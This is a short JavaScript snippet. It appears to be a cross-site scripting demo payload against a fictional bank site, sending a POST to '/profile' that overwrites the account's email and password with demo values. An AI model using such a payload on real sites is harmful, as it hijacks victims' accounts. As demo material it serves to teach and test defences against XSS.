fetch("/profile", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "email=xss-cdn-demo%40devbank.local&password=xss-demo-password"
});
